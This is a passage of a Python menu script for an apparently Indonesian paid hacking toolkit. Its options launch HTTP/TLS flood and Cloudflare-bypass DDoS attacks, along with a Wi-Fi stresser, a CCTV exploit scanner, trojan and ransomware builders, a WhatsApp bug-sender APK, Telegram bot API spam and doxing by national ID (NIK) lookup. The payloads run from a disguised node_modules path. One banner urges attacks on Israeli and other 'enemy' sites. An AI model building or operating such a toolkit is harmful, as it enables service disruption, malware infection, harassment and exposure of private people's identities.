 {BLUE}██████{CYAN}╔╝{BLUE}██{CYAN}║  {BLUE}██{CYAN}║{BLUE}██{CYAN}║  {BLUE}██{CYAN}║{BLUE}██{CYAN}║  {BLUE}██{CYAN}╗    {BLUE}██{CYAN}╔╝ {BLUE}██{CYAN}╗{BLUE}██{CYAN}║     {BLUE}███████{CYAN}╗╚{BLUE}██████{CYAN}╔╝{BLUE}██{CYAN}║   {BLUE}██{CYAN}║
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝
{BLUEBG}╔════════════════════════════════════════╦════════════════════════════════════════╗{RESET}
{BLUEBG}║ {RESET}{RED}[{WHITE}+{RED}] {CYAN}Author  {RED}: {WHITE}Shadow Xploit            {BLUEBG}║ {RESET}{RED}[{WHITE}+{RED}] {CYAN}Tools   {RED}: {WHITE}Cyber Security Toolkit  {BLUEBG} ║{RESET}
{BLUEBG}║ {RESET}{RED}[{WHITE}+{RED}] {CYAN}Contact {RED}: {WHITE}t.me/ShadowXploit        {BLUEBG}║ {RESET}{RED}[{WHITE}+{RED}] {CYAN}Version {RED}: {WHITE}4.0.5                   {BLUEBG} ║{RESET}
{BLUEBG}╠════════════════════════════════════════╩════════════════════════════════════════╣{RESET}
{BLUEBG}║ {RESET}{RED}                                   MAIN MENU                                   {BLUEBG} ║{RESET}""")
     print(
         f"{BLUEBG}"
         "╠══════╦═════════════════════════════════╦══════╦═════════════════════════════════╣"
         f"{RESET}"
     )
     for l, r in zip_longest(left, right, fillvalue=("", "")):
         lnum, lname = l
         rnum, rname = r
         left_plain = f"[{lnum}]{lname}" if lnum else ""
         right_plain = f"[{rnum}]{rname}" if rnum else ""
         left_plain = left_plain.ljust(COL_WIDTH)
         right_plain = right_plain.ljust(COL_WIDTH)
         left_col = (
             left_plain.replace(
                 f"[{lnum}]",
                 f"{RED}[{WHITE}{lnum}{RED}]{BLUEBG} ║ {RESET}{CYAN}"
             )
             if lnum else left_plain
         )
         right_col = (
             right_plain.replace(
                 f"[{rnum}]",
                 f"{RED}[{WHITE}{rnum}{RED}]{BLUEBG} ║ {RESET}{CYAN}"
             )
             if rnum else right_plain
         )
         print(
             f"{BLUEBG}║ {RESET}"
             f"{CYAN}{left_col}"
             f"{BLUEBG} ║ {RESET}"
             f"{CYAN}{right_col}"
             f"{BLUEBG} ║{RESET}"
         )
     print(
         f"{BLUEBG}"
         "╚══════╩═════════════════════════════════╩══════╩═════════════════════════════════╝"
         f"{RESET}"
     )

USERNAME = "Dark-Xploiter"
FILE = ".login.txt"

def cek_token(token):
    url = "https://api.github.com/user"
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/vnd.github+json",
    }
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            data_user = response.json()
            if data_user.get("login") == USERNAME:
                return True
            else:
                print(
                    "\n[Peringatan] Token tidak valid."
                )
                return False
        return False
    except requests.exceptions.RequestException:
        print(
            "\n[Error] Gagal terhubung ke Server. Silakan periksa koneksi internet Anda."
        )
        sys.exit(1)
        
def main():
    token_aktif = None
    if os.path.exists(FILE):
        print("Memvalidasi status token ke server...")
        try:
            with open(FILE, "r") as f:
                token_tersimpan = f.read().strip()
        except Exception as e:
            print(f"[Error] Gagal membaca file login: {e}")
            token_tersimpan = ""
        if token_tersimpan and cek_token(token_tersimpan):
            print("[Sukses] Token valid!")
            token_aktif = token_tersimpan
        else:
            print(
                "\n[Peringatan] Token kedaluwarsa!"
            )
            print("Silakan lakukan pembayaran untuk mendapatkan token baru.\n")
            try:
                os.remove(FILE)
            except OSError:
                pass
    if not token_aktif:
        token_input = (
            input("Masukkan Token Anda: ").strip()
        )
        if not token_input:
            print("\n[Error] Token tidak boleh kosong!")
            if os.name == "posix":
                os.system("xdg-open https://wa.me/6283141494320?text=Assalamualaikum..")
            elif os.name == "nt":
                os.system("start https://wa.me/6283141494320?text=Assalamualaikum..")
            sys.exit(0)
            return
        print("\nMemverifikasi token baru ke server...")
        if cek_token(token_input):
            token_aktif = token_input
            try:
                with open(FILE, "w") as f:
                    f.write(token_aktif)
                print(
                    f"[Sistem] Token berhasil disimpan otomatis ke '{FILE}'"
                )
            except Exception as e:
                print(f"[Peringatan] Gagal menyimpan token ke file: {e}")
        else:
            print("[AKSES DITOLAK] Token tidak valid!")
            if os.name == "posix":
                os.system("xdg-open https://wa.me/6283141494320?text=Assalamualaikum..")
            elif os.name == "nt":
                os.system("start https://wa.me/6283141494320?text=Assalamualaikum..")
            sys.exit(0)
            return
    print("[AKSES DIIZINKAN] Autentikasi Berhasil.")
    sleep(0)
    os.system("cls" if os.name == "nt" else "clear")
    logo()
main()
        
while True:
    try:
        message = input(f"{BLUE}┌──({RED}dark-x㉿localhost{BLUE})-[{WHITE}~{BLUE}]\n└─{RED}#{WHITE} ")
        if message.strip():
            if message == "0" or message == "00":
                print(f" {RED}[{WHITE}!{RED}] {YELLOW}Program dihentikan")
                print()
                break
            elif message == "1" or message == "01":
                os.system("cls" if os.name == "nt" else "clear")
                sleep(1)
                print(f" {BLUE}Note{RED}: {RESET}Serangan DDoS yang menargetkan lapisan aplikasi dari model OSI.\n Gunakan medote yg ringan (HTTP,MIX,CFB) jika anda menggunakan device\n dgn spesifikasi rendah.")
                print(f"""{BLUE}
    {BLUE}██{RED}╗        {BLUE}█████{RED}╗   {BLUE}██{RED}╗   {BLUE}██{RED}╗  {BLUE}███████{RED}╗  {BLUE}██████{RED}╗       {BLUE}███████{RED}╗
    {BLUE}██{RED}║       {BLUE}██{RED}╔══{BLUE}██{RED}╗  ╚{BLUE}██{RED}╗ {BLUE}██{RED}╔╝  {BLUE}██{RED}╔════╝  {BLUE}██{RED}╔══{BLUE}██{RED}╗      ╚════{BLUE}██{RED}║
    {BLUE}██{RED}║       {BLUE}███████{RED}║   ╚{BLUE}████{RED}╔╝   {BLUE}█████{RED}╗    {BLUE}██████{RED}╔╝          {BLUE}██{RED}╔╝
    {BLUE}██{RED}║       {BLUE}██{RED}╔══{BLUE}██{RED}║    ╚{BLUE}██{RED}╔╝    {BLUE}██{RED}╔══╝    {BLUE}██{RED}╔══{BLUE}██{RED}╗         {BLUE}██{RED}╔╝
    {BLUE}███████{RED}╗  {BLUE}██{RED}║  {BLUE}██{RED}║     {BLUE}██{RED}║     {BLUE}███████{RED}╗  {BLUE}██{RED}║  {BLUE}██{RED}║         {BLUE}██{RED}║
    {RED}╚══════╝  ╚═╝  ╚═╝     ╚═╝     ╚══════╝  ╚═╝  ╚═╝         ╚═╝  
""")
                print(f'''                              {RED}WARNING!!!
 DIMOHON KESADARANNYA UNTUK TIDAK MENARGETKAN WEB SEKOLAH, PEMERINTAH,
  & LAINNYA. KECUALI WEB SLOT, BOK*B, ISRAEL, & MUSUH-MUSUH LAINNYA.
    KARENA SEMUA YANG ANDA PERBUAT, ANDA AKAN MEMETIKNYA KEMBALI.
''')
                print(f" {RED}[{WHITE}1{RED}] {CYAN}HTTPv1")
                print(f" {RED}[{WHITE}2{RED}] {CYAN}HTTPv2")
                print(f" {RED}[{WHITE}3{RED}] {CYAN}HTTPv3")
                print(f" {RED}[{WHITE}4{RED}] {CYAN}HTTPv4")
                print(f" {RED}[{WHITE}5{RED}] {CYAN}Mix")
                print(f" {RED}[{WHITE}6{RED}] {CYAN}CF Bypass")
                print(f" {RED}[{WHITE}7{RED}] {CYAN}TLSv1")
                print(f" {RED}[{WHITE}8{RED}] {CYAN}TLSv2")
                print(f" {RED}[{WHITE}9{RED}] {CYAN}TLSv3")
                print(f" {RED}[{WHITE}0{RED}] {CYAN}Back To Menu")
                pilihan = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Method {CYAN}: {WHITE}")
                if pilihan.endswith("1"):
                    httpv1()
                    wait = input(f"\n {RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                elif pilihan.endswith("2"):
                    sleep(1)
                    url = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Target {RED}(ex. https://en.cis.org.il) {CYAN}: {THINWHITE}")
                    if ".id" in url:
                        sleep(1)
                        print(f"\n {RED}[{WHITE}-{RED}] {BLUE}Akses ditolak!!!\n")
                        sleep(0.5)
                        sys.exit()
                    else:
                        os.system(f"python3 node_modules/type/ㅤ/.f {url}")
                        wait = input(f"\n {RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                        os.system("cls" if os.name == "nt" else "clear")
                        logo()
                elif pilihan.endswith("3"):
                    os.system(f"python3 node_modules/type/ㅤ/.n")
                    wait = input(f"\n{RED}[{WHITE}+{RED}] {RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                elif pilihan.endswith("4"):
                    sleep(1)
                    httpv3()
                    wait = input(f"\n {RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                elif pilihan.endswith("5"):
                    sleep(1)
                    os.system("python3 node_modules/type/ㅤ/.m")
                    wait = input(f"\n {RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                elif pilihan.endswith("6"):
                    sleep(1)
                    url = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Target {RED}(ex. https://en.cis.org.il) {CYAN}: {THINWHITE}")
                    if ".id" in url:
                        sleep(1)
                        print(f"\n {RED}[{WHITE}-{RED}] {BLUE}Akses ditolak!!!\n")
                        sleep(0.5)
                        sys.exit()
                    else:
                        time = input(f" {RED}[{WHITE}+{RED}] {BLUE}Time {RED}(ex. 60) {CYAN}: {THINWHITE}")
                        print(f"\n {RED}[{WHITE}+{RED}] {BLUE}Press Ctr+C to stop the attack\n")
                        os.system(f"node node_modules/type/ㅤ/.ad {url} {time}")
                        wait = input(f"\n {RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                        os.system("cls" if os.name == "nt" else "clear")
                        logo()
                elif pilihan.endswith("7"):
                    sleep(1)
                    url = input(f" {RED}[{WHITE}+{RED}] {BLUE}Target {RED}(ex. https://en.cis.org.il) {CYAN}: {THINWHITE}")
                    if ".id" in url:
                        sleep(1)
                        print(f"\n {RED}[{WHITE}-{RED}] {BLUE}Akses ditolak!!!\n")
                        sleep(0.5)
                        sys.exit()
                    else:
                        req = input(f" {RED}[{WHITE}+{RED}] {BLUE}Request/s {RED}(ex. 200) {CYAN}: {THINWHITE}")
                        th = input(f" {RED}[{WHITE}+{RED}] {BLUE}Thread {RED}(ex. 100) {CYAN}: {THINWHITE}")
                        time = input(f" {RED}[{WHITE}+{RED}] {BLUE}Time {RED}(ex. 60) {CYAN}: {THINWHITE}")
                        print(f"\n {RED}[{WHITE}+{RED}] {BLUE}Press Ctr+Z to stop the attack\n")
                        os.system(f"node node_modules/type/ㅤ/.aa {url} {time} {req} {th} proxy.txt")
                        wait = input(f"\n {RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                        os.system("cls" if os.name == "nt" else "clear")
                        logo()
                elif pilihan.endswith("8"):
                    sleep(1)
                    #print(f"\n {RED}[{WHITE}+{RED}] {BLUE}Cukup memakan RAM & Disarankan tidak menggunakan HP kentang")
                    url = input(f" {RED}[{WHITE}+{RED}] {BLUE}Target {RED}(ex. https://en.cis.org.il) {CYAN}: {THINWHITE}")
                    if ".id" in url:
                        sleep(1)
                        print(f"\n {RED}[{WHITE}-{RED}] {BLUE}Akses ditolak!!!\n")
                        sleep(0.5)
                        sys.exit()
                    else:
                        req = input(f" {RED}[{WHITE}+{RED}] {BLUE}Request/s {RED}(ex. 200) {CYAN}: {THINWHITE}")
                        th = input(f" {RED}[{WHITE}+{RED}] {BLUE}Thread {RED}(ex. 100) {CYAN}: {THINWHITE}")
                        time = input(f" {RED}[{WHITE}+{RED}] {BLUE}Time {RED}(ex. 60) {CYAN}: {THINWHITE}")
                        os.system(f"node node_modules/type/ㅤ/.ab {url} {time} {req} {th} proxy.txt")
                        wait = input(f"\n{RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                        os.system("cls" if os.name == "nt" else "clear")
                        logo()
                elif pilihan.endswith("9"):
                    sleep(1)
                    #print(f"\n {RED}[{WHITE}+{RED}] {BLUE}Cukup memakan RAM & Disarankan tidak menggunakan HP kentang")
                    url = input(f" {RED}[{WHITE}+{RED}] {BLUE}Target {RED}(ex. https://en.cis.org.il) {CYAN}: {THINWHITE}")
                    if ".id" in url:
                        sleep(1)
                        print(f"\n {RED}[{WHITE}-{RED}] {BLUE}Akses ditolak!!!\n")
                        sleep(0.5)
                        sys.exit()
                    else:
                        req = input(f" {RED}[{WHITE}+{RED}] {BLUE}Request/s {RED}(ex. 200) {CYAN}: {THINWHITE}")
                        th = input(f" {RED}[{WHITE}+{RED}] {BLUE}Thread {RED}(ex. 100) {CYAN}: {THINWHITE}")
                        time = input(f" {RED}[{WHITE}+{RED}] {BLUE}Time {RED}(ex. 60) {CYAN}: {THINWHITE}")
                        print(f"\n {RED}[{WHITE}+{RED}] {BLUE}Press Ctr+C to stop the attack\n")
                        os.system(f"node node_modules/type/ㅤ/.ac {url} {time} {req} {th} proxy.txt")
                        wait = input(f"\n {RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                        os.system("cls" if os.name == "nt" else "clear")
                        logo()
                elif pilihan.endswith("5282552625"):
                    sleep(1)
                    os.system("python3 node_modules/type/ㅤ/.p")
                    wait = input(f"\n {RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                else:
                    sleep(1)
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
            elif message == "2" or message == "02":
                sleep(1)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"{BLUE}Note{RED}: {RESET}Serangan DoS yg menargetkan lapisan transport dari model OSI. Bisa juga digunakan untuk memutus koneksi Wi-Fi yg tersambung.\n")
                os.system("python3 node_modules/type/ㅤ/.u")
                wait = input(f"\n{RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "3" or message == "03":
                os.system("cls" if os.name == "nt" else "clear")
                os.system("python3 node_modules/type/ㅤ/.g")
                wait = input(f"\n{RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "4" or message == "04":
                #sleep(1)
                os.system("python3 node_modules/type/ㅤ/.i")
                wait = input(f"\n{RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "5" or message == "05":
                sleep(1)
                os.system("python3 node_modules/type/ㅤ/.o")
                wait = input(f"\n{RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "6" or message == "06":
                sleep(1)
                target = input(f" {RED}[{WHITE}+{RED}] {BLUE}Domain Target {RED}(ex. kpu.go.id) {CYAN}: {THINWHITE}")
                filetype = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Filetype {RED}(ex. pdf,xlsx,docx,csv/all) {CYAN}: {THINWHITE}")
                page = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Jumlah Halaman {RED}(ex. 3) {CYAN}: {THINWHITE}")
                os.system("cls" if os.name == "nt" else "clear")
                sleep(1)
                os.system(f"bash node_modules/type/ㅤ/.h -t {target} -e {filetype} -p {page}")
                print("")
                wait = input(f"{RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "7" or message == "07":
                sleep(1)
                url = input(f" {RED}[{WHITE}+{RED}] {BLUE}URL Target {RED}(ex. https://kpu.go.id) {CYAN}: {THINWHITE}")
                limit = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Jumlah Pencarian {RED}(ex. 5) {CYAN}: {THINWHITE}")
                sleep(1)
                os.system("cls" if os.name == "nt" else "clear")
                os.system(f"python3 node_modules/type/ㅤ/.e -d {url} -b {limit}")
                wait = input(f"\n{RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "8" or message == "08":
                sleep(1)
                os.system("cls" if os.name == "nt" else "clear")
                print(f"{BLUE}Note{RED}: {THINWHITE}Alat ini digunakan untuk menambah pengunjung/visitor pada web seperti blogspot.")
                os.system("php node_modules/type/ㅤ/.q")
                wait = input(f"\n{RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "627252727287" or message == "862527252":
                sleep(1)
                print(f"{RESET}Tutorial:")
                print("1. Klik tombol {RED}(I'm new here){RESET} & simpan tokennya jika perlu")
                print("2. Tekan enter lalu tunggu 1 menit")
                print("3. Langsung tekan enter lagi (jangan sampai terlambat)")
                print("4. Selesai, Anda sudah bisa mengakses Kali Linux secara\n   virtual menggunakan browser")
                #print("5. Jika ingin menyimpan data silakan copy & simpan token anda di tempat yg aman")
                sleep(1)
                if os.name == "posix":
                    os.system("xdg-open https://shell.segfault.net/#/dashboard")
                elif os.name == "nt":
                    os.system("start https://shell.segfault.net/#/dashboard")
                wait = input(f"\n{RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "9" or message == "09":
                sleep(1)
                print(f"{RESET}Tutorial:")
                print("1. Isi password ssh {RED}(segfault){RESET} lalu enter")
                print("2. Tekan enter lalu tunggu 1 menit")
                print("3. Langsung tekan enter lagi (jangan sampai terlambat)")
                print("4. Selesai, Anda sudah bisa mengakses Kali Linux secara\n   virtual di termux")
                print("5. Masukkan perintah {RED}(exit){RESET} utk menghentikan")
                print("6. Jika ingin menyimpan data, silakan copy token yg ada\n   di terminal dan paste di termux utk mengakses ulang")
                print(f'\nContoh: {RED}ssh -o "SetEnvnTgzVSCJLKOvIXRZOCZgWllC" root@lulz.segfault.net\n')
                print(f"{RED}[{WHITE}+{RED}] {CYAN}Please wait...{RESET}")
                os.system("ssh root@segfault.net")
                wait = input(f"\n{RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "10":
                sleep(1)
                print(f"\n {BLUE}Note{RED}: {THINWHITE}Perangkat harus tersambung terlebih dahulu pada wi-fi target.\n")
                print(f" {RED}[{WHITE}1{RED}] {CYAN}Start Wifi Stresser")
                print(f" {RED}[{WHITE}0{RED}] {CYAN}Back To Menu")
                pilihan = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Choose {RED}: {WHITE}")
                if pilihan.endswith("1"):
                    sleep(1)
                    os.system("node node_modules/type/ㅤ/.x")
                    wait = input(f"\n{RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                else:
                    sleep(1)
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
            elif message == "11":
                #os.system("cls" if os.name == "nt" else "clear")
                sleep(1)
                ip_track()
                wait = input(f" {RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "12":
                sleep(1)
                print(f"\n {RED}[{WHITE}1{RED}] {CYAN}Ubah Tampilan Termux")
                print(f" {RED}[{WHITE}2{RED}] {CYAN}Reset Tampilan Termux")
                print(f" {RED}[{WHITE}0{RED}] {CYAN}Back To Menu")
                pilihan = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Choose {RED}: {WHITE}")
                if pilihan.endswith("1"):
                    sleep(1)
                    termux_banner()
                    wait = input(f"\n {RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                elif pilihan.endswith("2"):
                    sleep(1)
                    os.system("cp node_modules/type/ㅤ/.sh1 $HOME/../usr/etc/bash.bashrc")
                    print(f"\n {RED}[{WHITE}+{RED}] {CYAN}Selesai")
                    sleep(0.5)
                    print(f"\n {RED}[{WHITE}+{RED}] {BLUE}Ketik {RED}login {BLUE}untuk mencoba!")
                    wait = input(f"\n {RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                else:
                    sleep(1)
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
            elif message == "13":
                sleep(1)
                #os.system("cls" if os.name == "nt" else "clear")
                os.system("python2 node_modules/type/ㅤ/.b")
                wait = input(f"\n{RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "14":
                sleep(1)
                username = input(f" {RED}[{WHITE}+{RED}] {BLUE}Target Username {RED}(ex. udin) {CYAN}: {THINWHITE}")
                os.system("cls" if os.name == "nt" else "clear")
                os.system(f"python3 node_modules/type/ㅤ/.s --search {username}")
                wait = input(f"\n{RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "15":
                print(f" {BLUE}Note{RED}: {THINWHITE}Dimohon kesadarannya untuk tidak menyalahgunakan tool ini.")
                sleep(1)
                #os.system("cls" if os.name == "nt" else "clear")
                #print(f"\n {RED}[{WHITE}+{RED}] {CYAN}Please wait...")
                os.system("python3 node_modules/type/ㅤ/.a")
                wait = input(f"\n{RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "16":
                sleep(1)
                email_sender()
                wait = input(f"\n{RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "17":
                sleep(1)
                print(f" {BLUE}Note{RED}: {THINWHITE}Jika anda menerima virus berbentuk undangan APK atau sejenisnya,\n silakan bongkar dan lihat source-nya lalu copy API telegram si penipu\n untuk dispam hingga down.")
                def start_spam():
                    sleep(1)
                    print(f"\n {RED}[{WHITE}1{RED}] {CYAN}Mulai Spam")
                    print(f" {RED}[{WHITE}2{RED}] {CYAN}Ganti Target")
                    print(f" {RED}[{WHITE}0{RED}] {CYAN}Back To Menu")
                    pilihan = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Choose {RED}: {WHITE}")
                    if pilihan.endswith("1"):
                        print(f"{THINWHITE}")
                        os.system("node node_modules/type/ㅤ/.w")
                    elif pilihan.endswith("2"):
                        def replace_text_in_first_line(input_file, output_file, new_text):
                            with open(input_file, 'r') as file:
                                lines = file.readlines()
                            lines[0] = new_text + '\n'
                            with open(output_file, 'w') as file:
                                file.writelines(lines)
                        input_file = 'urls.txt'
                        output_file = 'urls.txt'
                        sleep(1)
                        print(f"\n {RED}[{WHITE}+{RED}] {BLUE}Contoh API telegram {RED}: {THINWHITE}https://api.telegram.org/bot6857276354:AAH98ElI1j81M3c3KlcxoqIMzTX6H_EAIFA/sendMessage?parse_mode=markdown&chat_id=6310342995&text=")
                        sleep(0.3)
                        new_text = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Masukkan API target {RED}: {THINWHITE}")
                        replace_text_in_first_line(input_file, output_file, new_text)
                        print(f"\n {RED}[{WHITE}+{RED}] {BLUE}Target Telah Di Ganti")
                        start_spam()
                    else:
                        sleep(1)
                start_spam()
                wait = input(f"\n {RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "18":
                sleep(1)
                os.system("php node_modules/type/ㅤ/.v")
                wait = input(f"\n\n{RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "19":
                sleep(1)
                print(f" {BLUE}Note{RED}: {THINWHITE}Ini adalah aplikasi pengirim bug WhatsApp. Jangan gunakan akun pribadi karena\n berisiko kebanned. Setelah mengirim bug ke target segera logout agar nokos anda tdk\n disalahgunakan orang lain.")
                print(f"\n {RED}[{WHITE}1{RED}] {CYAN}Download APK Sender Bug WA")
                print(f" {RED}[{WHITE}0{RED}] {CYAN}Back To Menu")
                pilihan = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Choose {RED}: {WHITE}")
                if pilihan.endswith("1"):
                    os.system("cp node_modules/type/ㅤ/.sender_bug_wa /sdcard/Download/Sender_Bug_WhatsApp.apk")
                    print(f"\n {RED}[{WHITE}+{RED}] {BLUE}Download selesai, silakan install APK nya di folder Download memori internal")
                    wait = input(f"\n {RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                else:
                    sleep(1)
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
            elif message == "20":
                sleep(1)
                print(f" {BLUE}Note{RED}: {RESET}WhatsApp Web untuk memantau chat WA anak lewat terminal.")
                print(f"\n {RED}[{WHITE}1{RED}] {CYAN}Start WhatsApp Web")
                print(f" {RED}[{WHITE}0{RED}] {CYAN}Back To Menu")
                pilihan = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}Choose {RED}: {WHITE}")
                if pilihan.endswith("1"):
                    os.system("node node_modules/type/ㅤ/.wa")
                    wait = input(f"\n\n{RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                else:
                    sleep(1)
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
            elif message == "21":
                os.system("cls" if os.name == "nt" else "clear")
                print(f"{BLUE}Note{RED}: {RESET}Alat untuk memindai & mengeksekusi kerentanan CCTV dalam sebuah jaringan WiFi.")
                print("      Di bawah ini adalah IP dari WiFi yg sedang terhubung dengan anda.\n")
                sleep(1)
                os.system("ipconfig" if os.name == "nt" else "ifconfig")
                os.system("python node_modules/type/ㅤ/.k")
                wait = input(f"\n{RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "22":
                sleep(1)
                trojan()
                wait = input(f"\n {RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "23":
                sleep(1)
                ransomware()
                wait = input(f"\n {RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "24":
                sleep(1)
                #os.system("python3 node_modules/type/ㅤ/.d")
                file = input(f"\n {RED}[{WHITE}+{RED}] {BLUE}File {RED}(/sdcard/folder/file.py) {CYAN}: {THINWHITE}")
                lapisan = input(f" {RED}[{WHITE}+{RED}] {BLUE}Lapisan {RED}(ex.100) {CYAN}: {THINWHITE}")
                output = file.lower().replace('.py', '') + '_enc.py'
                os.system(f"python3 node_modules/type/ㅤ/.j -i {file} -o {output} -s {lapisan}")
                wait = input(f"\n        {RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "25":
                sleep(1)
                file = input(f"\n{RED}[{WHITE}+{RED}] {BLUE}File {RED}(/sdcard/folder/file.js) {CYAN}: {THINWHITE}")
                output = file.lower().replace('.js', '') + '_enc.js'
                os.system(f"javascript-obfuscator {file} --output {output} --compact true --control-flow-flattening true --dead-code-injection true --string-array true --rename-globals true")
                print(f"{RED}[{WHITE}+{RED}] {BLUE}Hasil encrypt tersimpan di {CYAN}: {THINWHITE}{output}")
                wait = input(f"\n{RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "272538352726":
                sleep(1)
                print(f"{RED}Tutorial:")
                print("1. Masuk telegram & klik start")
                print("2. Isi nomor dengan format 628xxxx lalu kirim")
                print("3. Jika berbayar, gunakan akun telegram lain")
                print("4. Klik paspor (NIK) nya dan cek di menu NIK Checker")
                sleep(1)
                if os.name == "posix":
                    os.system("xdg-open https://t.me/DoxArt_Bot")
                elif os.name == "nt":
                    os.system("start https://t.me/DoxArt_Bot")
                wait = input(f"\n{RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "26":
                sleep(1)
                nik = input(f"\n{RESET}Masukkan NIK: {TWINGREEN}")
                print(f"{RESET}")
                os.system(f"nik-parse -n {nik}")
                cari = input(f"\n{RESET}Lanjut cek nama dan lokasi NIK? (y/n): {TWINGREEN}")
                if cari == 'y':
                    if os.name == "posix":
                        sleep(1)
                        os.system("xdg-open https://cekdptonline.kpu.go.id/")
                    elif os.name == "nt":
                        sleep(1)
                        os.system("start https://cekdptonline.kpu.go.id/")
                    print(f"\n{RESET}Tutorial:")
                    print("1. Masuk browser")
                    print("2. Isi NIK target lalu klik tombol (Cari)")
                    print("3. Selesai. Anda mendapatkan informasi nama & desa dari target.")
                    #print("2. Isi NIK target lalu klik tombol (langkah 2)")
                    #print("3. Isi nomor WhatsApp anda untuk menerima OTP")
                    #print("4. Masukkan OTP yg dikirimkan ke WhatsApp anda")
                    #print("5. Selesai. Utk melihat lokasi, klik icon KPU pada peta")
                wait = input(f"\n{RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "27":
                sleep(1)
                bot_wa()
                wait = input(f"\n\n{RED}[{WHITE}+{RED}] {YELLOW}Press Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "LOGIN" or message == "login" or message == "Login":
                os.system("login")
            else:
